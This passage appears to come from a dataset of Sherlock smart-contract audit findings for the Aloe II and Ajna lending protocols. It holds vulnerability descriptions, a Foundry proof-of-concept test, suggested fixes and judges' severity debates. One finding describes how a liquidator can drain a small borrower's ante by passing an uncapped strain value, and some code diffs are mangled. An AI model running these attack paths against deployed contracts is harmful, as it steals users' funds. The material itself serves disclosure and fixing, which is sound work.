efficient).\nThat said, the whitehat is correct that the `VolatilityOracle` underestimates IV, and we will do our best to improve it. Unfortunately their first suggestion requires too much gas (at least for mainnet) and Opyn data would only work for a handful of markets. One idea is to allow IV to increase faster than it decreases -- in other words, use a different `IV_CHANGE_PER_UPDATE` constraint depending on whether IV is increasing or decreasing. You can see the impact of such a change in the plot below (compare ""OG"" vs ""New""). It reduces avg error from -29% to -14%. Variations on this idea could get even better.\nT3 Index data here; `VolatilityOracle` simulated for a few weeks at the beginning of this year using mainnet USDC/WETH 0.05% pair\n\nhaydenshively\nFixed in https://github.com/aloelabs/aloe-ii/pull/219"чThe lower `IV` increases LTV, which means far higher LTV for risky assets. `5 sigma` probability bad-debt events, as calculated by the protocol which is basically an impossibility, becomes possible/likely as the relationship between `IV` or `Pr(event)` is super-linear\nCode Snippet\nTool used\nManual Review
Bad debt liquidation doesn't allow liquidator to receive its ETH bonus (ante)чmediumч"```\n    function test_badDebtLiquidationAnte() public {\n\n        // malicious user borrows at max leverage + some safety margin\n        uint256 margin0 = 1e18;\n        uint256 borrows0 = 100e18;\n\n        deal(address(asset0), address(account), margin0);\n\n        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);\n        account.modify(this, data, (1 << 32));\n\n        // borrow increased by 50%\n        _setInterest(lender0, 15000);\n\n        emit log_named_uint(""User borrow:"", lender0.borrowBalance(address(account)));\n        emit log_named_uint(""User assets:"", asset0.balanceOf(address(account)));\n\n        // warn account\n        account.warn((1 << 32));\n\n        // skip warning time\n        skip(LIQUIDATION_GRACE_PERIOD);\n        lender0.accrueInterest();\n\n        // liquidation reverts because it requires asset the account doesn't have to swap\n        vm.expectRevert();\n        account.liquidate(this, bytes(""""), 1, (1 << 32));\n\n        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have\n        account.liquidate(this, bytes(""""), type(uint256).max, (1 << 32));\n\n        emit log_named_uint(""Liquidated User borrow:"", lender0.borrowBalance(address(account)));\n        emit log_named_uint(""Liquidated User assets:"", asset0.balanceOf(address(account)));\n        emit log_named_uint(""Liquidated User ante:"", address(account).balance);\n    }\n```\n"ч"More detailed scenario\nAlice account goes into bad debt for whatever reason. For example, the account has 150 DAI borrowed, but only 100 DAI assets.\nBob tries to `liquidate` Alice account, but his transaction reverts, because remaining DAI liability after repaying 100 DAI assets Alice has, will be 50 DAI bad debt. `liquidate` code will try to call Bob's callee contract to swap 0.03 WETH to 50 DAI sending it 0.03 WETH. However, since Alice account has 0 WETH, the transfer will revert.\nBob tries to work around the liquidation problem: 3.1. Bob calls `liquidate` with `strain` set to `type(uint256).max`. Liquidation succeeds, but Bob doesn't receive anything for his liquidation (he receives 0 ETH bonus). Alice's ante is stuck in the contract until Alice bad debt is fully repaid. 3.2. Bob sends 0.03 WETH directly to Alice account and calls `liquidate` normally. It succeeds and Bob gets his bonus for liquidation (0.01 ETH). He has 0.02 ETH net loss from liquidaiton (in addition to gas fees).\nIn both cases there is no incentive for Bob to liquidate Alice. So it's likely Alice account won't be liquidated and a borrow of 150 will be stuck in Alice account for a long time. Some lender depositors who can't withdraw might still have incentive to liquidate Alice to be able to withdraw from lender, but Alice's ante will still be stuck in the contract.\n```\n    function test_badDebtLiquidationAnte() public {\n\n        // malicious user borrows at max leverage + some safety margin\n        uint256 margin0 = 1e18;\n        uint256 borrows0 = 100e18;\n\n        deal(address(asset0), address(account), margin0);\n\n        bytes memory data = abi.encode(Action.BORROW, borrows0, 0);\n        account.modify(this, data, (1 << 32));\n\n        // borrow increased by 50%\n        _setInterest(lender0, 15000);\n\n        emit log_named_uint(""User borrow:"", lender0.borrowBalance(address(account)));\n        emit log_named_uint(""User assets:"", asset0.balanceOf(address(account)));\n\n        // warn account\n        account.warn((1 << 32));\n\n        // skip warning time\n        skip(LIQUIDATION_GRACE_PERIOD);\n        lender0.accrueInterest();\n\n        // liquidation reverts because it requires asset the account doesn't have to swap\n        vm.expectRevert();\n        account.liquidate(this, bytes(""""), 1, (1 << 32));\n\n        // liquidate with max strain to avoid revert when trying to swap assets account doesn't have\n        account.liquidate(this, bytes(""""), type(uint256).max, (1 << 32));\n\n        emit log_named_uint(""Liquidated User borrow:"", lender0.borrowBalance(address(account)));\n        emit log_named_uint(""Liquidated User assets:"", asset0.balanceOf(address(account)));\n        emit log_named_uint(""Liquidated User ante:"", address(account).balance);\n    }\n```\n\nExecution console log:\n```\n  User borrow:: 150000000000000000000\n  User assets:: 101000000000000000000\n  Liquidated User borrow:: 49000000162000000001\n  Liquidated User assets:: 0\n  Liquidated User ante:: 10000000000000001\n```\n\nCode Snippet\nNotice, that if both assets are 0, `liabilities0` or `liabilities1` will still be non-0 if bad debt has happened.\nTool used\nManual Review"чConsider verifying the bad debt situation and not forcing swap which will fail, so that liquidation can repay whatever assets account still has and give liquidator its full bonus.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nMohammedRizwan commented:\nvalid\nShogoki\nEscalate I think this should be duplicated with #32, (same as #104) It just describes better one specific case why there is no incentive for liquidations when bad debt was accrued.\nsherlock-admin2\nEscalate I think this should be duplicated with #32, (same as #104) It just describes better one specific case why there is no incentive for liquidations when bad debt was accrued.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\npanprog\nEscalate\nI disagree that it's a duplicate of #32, because the main point of this issue is that liquidator will be unable to receive ETH ante bonus if the account is in bad debt, while #32 describes why bad debt can cause bank run and further bad debt accumulation. The underlying problem and fix to this one is very simple and completely different from #32. That's why this issue should be a separate valid medium one.\nsherlock-admin2\nEscalate\nI disagree that it's a duplicate of #32, because the main point of this issue is that liquidator will be unable to receive ETH ante bonus if the account is in bad debt, while #32 describes why bad debt can cause bank run and further bad debt accumulation. The underlying problem and fix to this one is very simple and completely different from #32. That's why this issue should be a separate valid medium one.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nBanditx0x\nIf it isn't a dupe, it has very minuscule impact in a very rare edge case\npanprog\nIf it isn't a dupe, it has very minuscule impact in a very rare edge case\nThis is the definition for medium: something that can cause loss of funds even if very unlikely. I agree that the chances of this happening are not very high, but it's possible and it causes loss of funds. So this should be a valid medium.\ncvetanovv\nI agree with panprog escalation. In my opinion should be separated and is a valid medium\nTrumpero\nPlanning to accept the escalation from @panprog, reject escalation from @Shogoki, and mark this issue as a unique medium.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\npanprog: accepted\nShogoki: rejectedчLiquidators are not compensated for bad debt liquidations in some cases. Ante (liquidator bonus) is stuck in the borrower smart contract until bad debt is repaid. There is not enough incentive to liquidate such bad debt accounts, which can lead for these accounts to accumulate even bigger bad debt and lender depositors being unable to withdraw their funds from lender.
Oracle.sol: observe function has overflow risk and should cast to uint256 like Uniswap V3 doesчmediumч```\nliqCumL + uint160(((liqCumR - liqCumL) * delta) / denom)\n```\nчLooking at the `Oracle.observe` function, the `secondsPerLiquidityCumulativeX128` return value is calculated as follows:\n```\nliqCumL + uint160(((liqCumR - liqCumL) * delta) / denom)\n```\n\nThe calculation is done in an `unchecked` block. `liqCumR` and `liqCumL` have type `uint160`.\n`delta` and `denom` have type `uint56`.\nLet's compare this to the Uniswap V3 code.\n```\nbeforeOrAt.secondsPerLiquidityCumulativeX128 +\n    uint160(\n        (uint256(\n            atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128\n        ) * targetDelta) / observationTimeDelta\n    )\n```\n\nThe result of `atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128` is cast to `uint256`.\nThat's because multiplying the result by `targetDelta` can overflow the `uint160` type.\nThe maximum value of `uint160` is roughly `1.5e48`.\n`delta` is simply the time difference between `timeL` and `target` in seconds.\n```\nsecondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +\n    ((uint160(delta) << 128) / (liquidity > 0 ? liquidity : 1)),\n```\n\nIf `liquidity` is very low and the time difference between observations is very big (hours to days), this can lead to the intermediate overflow in the `Oracle` library, such that the `secondsPerLiquidityCumulative` is much smaller than it should be.\nThe lowest value for the above division is `1`. In that case the accumulator grows by `2^128` (~3.4e38) every second.\nIf observations are apart 24 hours (86400 seconds), this can lead to an overflow: Assume for simplicity `target - timeL = timeR - timeL`\n```\n(liqCumR - liqCumL) * delta = 3.4e38 * 86400 * 86400 > 1.5e48`\n```\nчPerform the same cast to `uint256` that Uniswap V3 performs:\n```\nliqCumL + uint160((uint256(liqCumR - liqCumL) * delta) / denom)\n```\n\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\ntsvetanovv commented:\nI don't think this is problem because liqCumR and liqCumL are uint160\nMohammedRizwan commented:\nvalid\nhaydenshively\nValid high, will fix\npanprog\nEscalate\nThis should be a valid medium, not high, because while the situation is possible, it can only happen when liquidity is extremely low (basically no liquidity). The example calculation assumes minimum liquidity value (0 or 1):\n```\nsecondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +\n    ((uint160(delta) << 128) / (liquidity > 0 ? liquidity : 1)),\n// rest of code\n(liqCumR - liqCumL) * delta = 3.4e38 * 86400 * 86400 ~= 2.5e48 > 1.5e48`\n```\n\nEven with such a low liquidity value the overflow happens just barely. Even a value of 2 for liquidity already won't overflow. If the pool has 0 liquidity (or 1, 2 or even 100 - even for token with 6 decimals that's basically empty pool) for over a day - nobody should/will really use it. Any semi-active pool which will actually be used will have much higher liquidity at all times.\nSo the issue describes a very edge case which most probably won't ever happen in real life.\nThe reporter probably also understands it and set his reported issue severity to medium, not high.\nsherlock-admin2\nEscalate\nThis should be a valid medium, not high, because while the situation is possible, it can only happen when liquidity is extremely low (basically no liquidity). The example calculation assumes minimum liquidity value (0 or 1):\n`secondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +\n    ((uint160(delta) << 128) / (liquidity > 0 ? liquidity : 1)),\n...\n(liqCumR - liqCumL) * delta = 3.4e38 * 86400 * 86400 ~= 2.5e48 > 1.5e48``\nEven with such a low liquidity value the overflow happens just barely. Even a value of 2 for liquidity already won't overflow. If the pool has 0 liquidity (or 1, 2 or even 100 - even for token with 6 decimals that's basically empty pool) for over a day - nobody should/will really use it. Any semi-active pool which will actually be used will have much higher liquidity at all times.\nSo the issue describes a very edge case which most probably won't ever happen in real life.\nThe reporter probably also understands it and set his reported issue severity to medium, not high.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nroguereddwarf\n@panprog\nI agree with the escalation. I intentionally reported this as Medium due to the Low likelihood.\nTrumpero\nPlanning to accept escalation and downgrade this issue to medium because of the low likelihood.\nCzar102\nResult: Medium Unique\nAll parties agree on the above result.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\npanprog: accepted\nhaydenshively\nFixed in https://github.com/aloelabs/aloe-ii/pull/208чThe corrupted return value affects the `Volatility` library. Specifically, the IV calculation.\nThis can lead to wrong IV updates and LTV ratios that do not reflect the true IV, making the application more prone to bad debt or reducing capital efficiency.\nCode Snippet\nTool used\nManual Review
The whole ante balance of a user with a very small loan, who is up for liquidation can be stolen without repaying the debtчmediumч"```\nassembly (""memory-safe"") {\n // // rest of code\n liabilities0 := div(liabilities0, strain) // @audit rounds down to 0 <-\n liabilities1 := div(liabilities1, strain) // @audit rounds down to 0 <-\n // // rest of code\n}\n```\n"ч"Users face liquidation risk when their Borrower contract's collateral falls short of covering their loan. The `strain` parameter in the liquidation process enables liquidators to partially repay an unhealthy loan. Using a `strain` smaller than 1 results in the liquidator receiving a fraction of the user's collateral based on `collateral / strain`.\nThe problem arises from the fact that the `strain` value is not capped, allowing for a potentially harmful scenario. For instance, a user with an unhealthy loan worth $0.30 in a WBTC (8-decimal token) vault on Arbitrum (with very low gas costs) has $50 worth of ETH (with a price of $1500) as collateral in their Borrower contract. A malicious liquidator spots the unhealthy loan and submits a liquidation transaction with a `strain` value of 1e3 + 1. Since the `strain` exceeds the loan value, the liquidator's repayment amount gets rounded down to 0, effectively allowing them to claim the collateral with only the cost of gas.\n```\nassembly (""memory-safe"") {\n // // rest of code\n liabilities0 := div(liabilities0, strain) // @audit rounds down to 0 <-\n liabilities1 := div(liabilities1, strain) // @audit rounds down to 0 <-\n // // rest of code\n}\n```\n\nFollowing this, the execution bypasses the `shouldSwap` if-case and proceeds directly to the following lines:\n```\n// @audit Won't be repaid in full since the loan is insolvent\n_repay(repayable0, repayable1);\nslot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n\n// @audit will transfer the user 2e14 (0.5$)\npayable(callee).transfer(address(this).balance / strain);\nemit Liquidate(repayable0, repayable1, incentive1, priceX128);\n```\n\nGiven the low gas price on Arbitrum, this transaction becomes profitable for the malicious liquidator, who can repeat it to drain the user's collateral without repaying the loan. This not only depletes the user's collateral but also leaves a small amount of bad debt on the market, potentially causing accounting issues for the vaults."ч"Consider implementing a check to determine whether the repayment impact is zero or not before transferring ETH to such liquidators.\n```\nrequire(repayable0 != 0 || repayable1 != 0, ""Zero repayment impact."") // @audit <-\n_repay(repayable0, repayable1);\n\nslot0 = (slot0_ & SLOT0_MASK_POSITIONS) | SLOT0_DIRT;\n\npayable(callee).transfer(address(this).balance / strain);\nemit Liquidate(repayable0, repayable1, incentive1, priceX128);\n```\n\nAdditionally, contemplate setting a cap for the `strain` and potentially denoting it in basis points (BPS) instead of a fraction. This allows for more flexibility when users intend to repay a percentage lower than 100% but higher than 50% (e.g., 60%, 75%, etc.).\nDiscussion\nsherlock-admin2\n2 comment(s) were left on this issue during the judging contest.\npanprog commented:\nlow, because it's more profitable to just straight liquidate fully, besides the loss per transaction will be very small\nMohammedRizwan commented:\nvalid\nShogoki\nEscalate I think this is a Low issue. The attack is not profitable, it would probably be more profitable to straight liquidate the position. Therefore a liquidation bot would probably do that.\nIn case of the `ANTE` the user looses, i would not consider it a real loss, as it is expected he has to pay it for liquidation anyhow.\nsherlock-admin2\nEscalate I think this is a Low issue. The attack is not profitable, it would probably be more profitable to straight liquidate the position. Therefore a liquidation bot would probably do that.\nIn case of the `ANTE` the user looses, i would not consider it a real loss, as it is expected he has to pay it for liquidation anyhow.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nCrisCodesCrap\nThe vector above is profitable under the stated assumptions It demonstrates that the attacker does not need to pay off any of the debt of the victim, but can freely take the ante without paying for anything else than the gas for the transaction, hence they profit without completing the action and stealing the funds from the victim, but leaving them with unpaid debt.\nOot2k\nAgree with escalation\ncvetanovv\nI disagree with the escalation and this report should remain a valid Medium. The Sponsor also confirms that this is a valid Medium. Although unlikely to be exploited this way due to the opportunity cost, Watson correctly demonstrates how this can be a profitable attack vector.\nCzar102\nResult: Medium Unique\nA bug that inflicts a loss to the attacker but also compromises the system is a valid medium.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nShogoki: rejected"чUsers with small loans face the theft of their collateral without the bad debt being covered, leading to financial losses for the user. Additionally, this results in a potential amount of bad debt that can disrupt the vault's accounting.\nCode Snippet\nTool used\nManual Review
Wrong auctionPrice used in calculating BPF to determine bond reward (or penalty)чmediumч```\nfunction _prepareTake(\n        Liquidation memory liquidation_,\n        uint256 t0Debt_,\n        uint256 collateral_,\n        uint256 inflator_\n    ) internal view returns (TakeLocalVars memory vars) {\n // rest of code// rest of code..\n        vars.auctionPrice = _auctionPrice(liquidation_.referencePrice, kickTime);\n        vars.bondFactor   = liquidation_.bondFactor;\n        vars.bpf          = _bpf(\n            vars.borrowerDebt,\n            collateral_,\n            neutralPrice,\n            liquidation_.bondFactor,\n            vars.auctionPrice\n        );\n```\nч2.In _prepareTake() function,the BPF is calculated using vars.auctionPrice which is calculated by _auctionPrice() function.\n```\nfunction _prepareTake(\n        Liquidation memory liquidation_,\n        uint256 t0Debt_,\n        uint256 collateral_,\n        uint256 inflator_\n    ) internal view returns (TakeLocalVars memory vars) {\n // rest of code// rest of code..\n        vars.auctionPrice = _auctionPrice(liquidation_.referencePrice, kickTime);\n        vars.bondFactor   = liquidation_.bondFactor;\n        vars.bpf          = _bpf(\n            vars.borrowerDebt,\n            collateral_,\n            neutralPrice,\n            liquidation_.bondFactor,\n            vars.auctionPrice\n        );\n```\n\n3.The _takeBucket() function made a judgment after _prepareTake()\n```\n // cannot arb with a price lower than the auction price\nif (vars_.auctionPrice > vars_.bucketPrice) revert AuctionPriceGtBucketPrice();\n// if deposit take then price to use when calculating take is bucket price\nif (params_.depositTake) vars_.auctionPrice = vars_.bucketPrice;\n```\n\nso the root cause of this issue is that in a scenario where a user calls Deposit Take(params_.depositTake ==true) ,BPF will calculated base on vars_.auctionPrice instead of bucketPrice.\n```\n vars_ = _calculateTakeFlowsAndBondChange(\n            borrower_.collateral,\n            params_.inflator,\n            params_.collateralScale,\n            vars_\n        );\n// rest of code// rest of code// rest of code// rest of code.\n_rewardBucketTake(\n            auctions_,\n            deposits_,\n            buckets_,\n            liquidation,\n            params_.index,\n            params_.depositTake,\n            vars_\n        );\n```\nч"
Incorrect implementation of `BPF` leads to kicker losing rewards in a `take` actionчmediumч```\n// If TP < NP\nBPF = bondFactor * min(1, max(-1, (NP - price) / (NP - TP)))\n\n// If TP >= NP\nBPF = bondFactor     (if price <= NP)\nBPF = -bondFactor    (if price > NP)\n```\nчThe Bond Payment Factor (BPF) is the formula that determines the reward/penalty over the bond of a kicker in each `take` action. According to the whitepaper, the formula is described as:\n```\n// If TP < NP\nBPF = bondFactor * min(1, max(-1, (NP - price) / (NP - TP)))\n\n// If TP >= NP\nBPF = bondFactor     (if price <= NP)\nBPF = -bondFactor    (if price > NP)\n```\n\n```\nfunction _bpf(\n    uint256 debt_,\n    uint256 collateral_,\n    uint256 neutralPrice_,\n    uint256 bondFactor_,\n    uint256 auctionPrice_\n) pure returns (int256) {\n    int256 thresholdPrice = int256(Maths.wdiv(debt_, collateral_));\n\n    int256 sign;\n    if (thresholdPrice < int256(neutralPrice_)) {\n        // BPF = BondFactor * min(1, max(-1, (neutralPrice - price) / (neutralPrice - thresholdPrice)))\n        sign = Maths.minInt(\n            1e18,\n            Maths.maxInt(\n                -1 * 1e18,\n                PRBMathSD59x18.div(\n                    int256(neutralPrice_) - int256(auctionPrice_),\n                    int256(neutralPrice_) - thresholdPrice\n                )\n            )\n        );\n    } else {\n        int256 val = int256(neutralPrice_) - int256(auctionPrice_);\n        if (val < 0 )      sign = -1e18;\n        else if (val != 0) sign = 1e18; // @audit Sign will be zero when NP = auctionPrice\n    }\n\n    return PRBMathSD59x18.mul(int256(bondFactor_), sign);\n}\n```\n\nThe issue is that the implementation of the `BPF` formula in the code doesn't match the specification, leading to the loss of rewards in that `take` action in cases where `TP >= NP` and `price = NP`.\nAs showed in the above snippet, in cases where `TP >= NP` and `NP = price` (thus val = 0) the function won't set a value for `sign` (will be `0` by default) so that will result in a computed `BPF` of `0`, instead of `bondFactor` that would be the correct `BPF`.ч"Change the `_bpf` function to match the specification in order to fairly distribute the rewards in a `take` action:\n```\nfunction _bpf(\n    uint256 debt_,\n    uint256 collateral_,\n    uint256 neutralPrice_,\n    uint256 bondFactor_,\n    uint256 auctionPrice_\n) pure returns (int256) {\n    int256 thresholdPrice = int256(Maths.wdiv(debt_, collateral_));\n\n    int256 sign;\n    if (thresholdPrice < int256(neutralPrice_)) {\n        // BPF = BondFactor * min(1, max(// Remove the line below\n1, (neutralPrice // Remove the line below\n price) / (neutralPrice // Remove the line below\n thresholdPrice)))\n        sign = Maths.minInt(\n            1e18,\n            Maths.maxInt(\n                // Remove the line below\n1 * 1e18,\n                PRBMathSD59x18.div(\n                    int256(neutralPrice_) // Remove the line below\n int256(auctionPrice_),\n                    int256(neutralPrice_) // Remove the line below\n thresholdPrice\n                )\n            )\n        );\n    } else {\n        int256 val = int256(neutralPrice_) // Remove the line below\n int256(auctionPrice_);\n        if (val < 0 )      sign = // Remove the line below\n1e18;\n// Remove the line below\n       else if (val != 0) sign = 1e18;\n// Add the line below\n       else               sign = 1e18;\n    }\n\n    return PRBMathSD59x18.mul(int256(bondFactor_), sign);\n}\n```\n\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\nn33k commented:\n""consistent with the whitepaper, sign could be 0""\nsantipu03\nEscalate\nThis issue has been erroneously excluded and should be high severity because the `_bpf` function DOES NOT adhere to the specification and it causes the loss of rewards for a kicker. This was confirmed by the sponsors during the contest.\nAs a summary, the whitepaper states the following:\nIf 𝑇𝑃 ≥ 𝑁𝑃, then the second factor in this equation is replaced with the step function that returns +1 if the take price is less than or equal to the NP, and -1 otherwise: 𝐵𝑃𝐹 = 𝐵𝑜𝑛𝑑𝐹𝑎𝑐𝑡𝑜𝑟        if 𝑃𝑟𝑖𝑐𝑒𝑡𝑎𝑘𝑒 ≤ 𝑁𝑃 𝐵𝑃𝐹 = − 𝐵𝑜𝑛𝑑𝐹𝑎𝑐𝑡𝑜𝑟     if 𝑃𝑟𝑖𝑐𝑒𝑡𝑎𝑘𝑒 > 𝑁𝑃\nTherefore, following the specification, in cases when `TP ≥ NP` and `PriceTake = NP`, then the correct `BPF` should be: `BPF` = `BondFactor`. But in these cases, the implementation erroneously sets `BPF = 0`. The impact will be that the kicker will lose all the rewards on that `take` action because `BPF` is set to `0` instead of `BondFactor`.\nIf the auction is completed in one take, the kicker will lose all the rewards from that auction that should belong to him. If the auction is settled later in time after this action, then the `auctionPrice` (priceTake) will be lower than `NP` so the kicker will lose part of the bond because of this issue (because the lost rewards would cancel out the later losses).\nsherlock-admin2\nEscalate\nThis issue has been erroneously excluded and should be high severity because the `_bpf` function DOES NOT adhere to the specification and it causes the loss of rewards for a kicker. This was confirmed by the sponsors during the contest.\nAs a summary, the whitepaper states the following:\nIf 𝑇𝑃 ≥ 𝑁𝑃, then the second factor in this equation is replaced with the step function that returns +1 if the `take` price is less than or equal to the `NP`, and -1 otherwise: 𝐵𝑃𝐹 = 𝐵𝑜𝑛𝑑𝐹𝑎𝑐𝑡𝑜𝑟        if 𝑃𝑟𝑖𝑐𝑒𝑡𝑎𝑘𝑒 ≤ 𝑁𝑃 𝐵𝑃𝐹 = − 𝐵𝑜𝑛𝑑𝐹𝑎𝑐𝑡𝑜𝑟     if 𝑃𝑟𝑖𝑐𝑒𝑡𝑎𝑘𝑒 > 𝑁𝑃\nTherefore, following the specification, in cases when TP ≥ `NP` and PriceTake = `NP`, then the correct `BPF` should be: `BPF` = `BondFactor`. But in these cases, the implementation erroneously sets `BPF = 0`. The impact will be that the kicker will lose all the rewards on that `take` action because `BPF` is set to `0` instead of `BondFactor`.\nIf the auction is completed in one `take`, the kicker will lose all the rewards from that auction that should belong to him. If the auction is settled later in time after this action, then the `auctionPrice` (priceTake) will be lower than `NP` so the kicker will lose part of the bond because of this issue (because the lost rewards would cancel out the later losses).\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nneeksec\nThis is a valid one. I suggest to set severity to `Medium` because the probability of meeting the condition NP=TP is pretty low.\nkadenzipfel\nThis should be low severity as it's a slight inconsistency from the specification which has an extremely low chance of occurring considering the fact that two independently varying 18 decimal numbers are extremely unlikely to collide.\nFurthermore, there's no loss of funds as one wei in each direction would be a gain or a loss in bond reward or penalty respectively. There's no flaw in the design of making the reward 0 in this circumstance as it would be just as reasonable for the protocol to deem NP == price as a penalized circumstance as it is to make it rewarded or neutral.\nsantipu03\nIt's correct that it's highly unlikely for this scenario to happen, but in case it occurs, the impact is high because is causing the kicker to lose all the rewards in that `take` action.\nThis issue doesn't argue wether the design is flawed or not, it simply points out a scenario where the kicker should be winning a reward over the bond but actually doesn't because of an error on the code.\nkadenzipfel\nGiven the level of precision, 1/1,000,000,000 is probably an optimistic likelihood of this occurring. We can reasonably write off the impact of it actually happening with these odds.\nSee judging docs for medium severity: ""The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future.""\nEvert0x\nIf the `1/1,000,000,000` odds are optimistic, I plan to reject escalation and keep issues state as is.\n@santipu03 please follow up with a comment if you see a more realistic scenario or attack path where NP will be equal to TP\nCzar102\n@santipu03 is there any reason why could `NP = TP` with a larger probability? Could this be manipulated easily? What happens with the kicker's reward, is it locked forever or is it owned by anyone?\nsantipu03\nI want to emphasize that this issue has significant implications not only for the kicker but also for the borrower. Specifically, the borrower faces the risk of receiving less repayment from the taker than deserved. This situation arises if the Bond Payment Factor (BPF) is erroneously set to 0 (like in this case), which in turn increases the Take Penalty Factor (TPF). Consequently, the taker repays a lesser portion of the borrower's debt for the same token amount in the `take` action. Then, the tokens intended for the kicker and borrower will be mistakenly redirected to reserves.\nThe severity of this issue is undeniably high, though is difficult to predict its likelihood.\nAjna's goal is to operate as an immutable, trustless protocol. Over time, it's probable that this issue will eventually manifest, leading to significant disruptions, such as kickers losing rewards and borrowers facing undue penalties.\nThe issue has been confirmed by the sponsors via DMs, and they are likely to have already addressed it. However, given the uncertainty surrounding its probability, I'll leave the judges with the final decision and will respect that.\nCzar102\n@santipu03 please provide information if it is possible to influence the result of `NP = TP`. If those values are like random numbers of order `1e18` then I will classify this as a Medium. Otherwise please explain in detail how could the attacker change the values of any/both of these variables so that they could collide in a real-life scenario.\nsantipu03\nTo recap, this issue arises because when `TP >= NP` and `NP = auctionPrice`. In such cases, the kicker should receive full rewards (bondFactor) as per the specification, but due to a bug, the kicker will earn nothing. Additionally, this bug results in increased penalties for the borrower.\nThe scenario of `TP >= NP` is likely, but `NP` equalling `auctionPrice` is less probable. However, it's still possible and can be exploited by an attacker.\n`NP` (Neutral Price) is fixed at the time a borrower is kicked and remains unchanged throughout the auction. In contrast, `auctionPrice` starts at `referencePrice` and decreases over time. An attacker can manipulate this by calling `take` shortly before it should be due to market conditions, to keep the `auctionPrice` high, or by delaying it, allowing the `auctionPrice` to lower. This way an attacker can game the value of `auctionPrice` griefing the kicker and borrower.\nCzar102\n@neeksec would you agree with the above statement that the attacker can manipulate the `auctionPrice` by carefully using `take`? Or is it more difficult?\nneeksec\nI agree that the `taker` can control `auctionPrice` to some extent. But making `auctionPrice` equal to NP is still very difficult.\n`_auctionPrice` involves complex computations, and the `taker` can only control the `block.timestamp` within it by delaying the call to `take`. The final result returned is difficult to be manipluted to be equal to NP with this limited control over `block.timestamp`.\nCzar102\nI don't know the codebase, but I would think that for certain situations (like very low price), the probability of a collision is larger. If the two parameters that need to equal can be manipulated by changing a timestamp parameter, this allows the attacker for only `1e3 - 1e4` additional ""trials"", which doesn't change the probability to any reasonable level (hence it's of the order of `1e-14` now). @santipu03 are you sure you can't come up for any reasons to increase the probability? PoC or an extremely detailed explanation appreciated. This issue surely won't be of high severity, but it still has an opportunity to qualify for medium.\nsantipu03\nI've just realised we've been missing a critical factor in this issue.\nTo clarify, the `_auctionPrice` function is designed so that 18 hours after `kickTime` (equivalent to 64,800 seconds), it will return a value equal to `referencePrice`. The calculation of `referencePrice` is determined as the maximum of `NP` and `HTP`, and typically `NP` is higher than `HTP`. This means that once 18 hours have elapsed in the auction, the `auctionPrice` will align exactly with the value of `NP`.\nI found out this by playing with a variation of the `_auctionPrice` function:\n```\nfunction _auctionPrice(\n    uint256 referencePrice_,\n// Remove the line below\n   uint256 kickTime_\n// Add the line below\n   uint256 secondsElapsed\n) view returns (uint256 price_) {\n// Remove the line below\n   uint256 elapsedMinutes = Maths.wdiv((block.timestamp // Remove the line below\n kickTime_) * 1e18, 1 minutes * 1e18);\n// Add the line below\n  uint256 elapsedMinutes = Maths.wdiv(secondsElapsed * 1e18, 1 minutes * 1e18);\n\n    // // rest of code\n}\n```\n\nIf we paste this variation of `_auctionPrice` into chisel it reveals that when `secondsElapsed = 64800`, the value returned is `referencePrice / 256`, which is essentially the same as NP:\n```\n ➜ _auctionPrice(256e18, 64800) == 1e18\nType: bool\n└ Value: true\n```\n\nWhat this implies is that the likelihood of `NP` matching `auctionPrice` is not as low as previously thought. Specifically, at the exact 18-hour mark since the auction started, `NP` will equal `auctionPrice`. This collision will trigger the impact we discussed earlier. Given that Ethereum blocks are generated approximately every 12 seconds, it means that for every auction reaching 18 hours (most of them), there's about a 1 in 12 chance that `NP` will coincide with `auctionPrice`, posing a significant risk.\nCzar102\n@neeksec can you confirm?\nneeksec\n@Czar102 After reviewing the relevant code along with Section 7.2 'Liquidation Call' of the whitepaper, I can confirm that @santipu03 is correct in his https://github.com/sherlock-audit/2023-09-ajna-judging/issues/18#issuecomment-1821310337.\nThe auctionPrice_ will intersect with neutralPrice_ at a predetermined time, within the 72 hour auction. This issue is highly likely to occur.\nkadenzipfel\nIn the case that NP > HTP and referencePrice = NP, it is true that the auctionPrice == referencePrice, and thus the BPF will unexpectedly be 0. Furthermore, the likelihood is even higher than suggested here where the block time doesn't have to be perfectly timed, it just has to be within the two hour window before the next halving. The likelihood is thus reasonably high to constitute a valid issue on the basis of likelihood.\nTo be clear though, this should certainly not be classified as a high severity as initially suggested in the escalation, and arguably not even a medium, for the following reason:\nIf the auctionPrice > NP, the kicker earns a fee and the taker pays a fee.\nIf the auctionPrice < NP, the taker earns a fee and the kicker pays a fee.\nThus, it would be a reasonable design decision to make it such that if the auctionPrice == NP, that no one pays a fee.\nNote the criteria for medium and high severity vulnerabilities: ""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" This 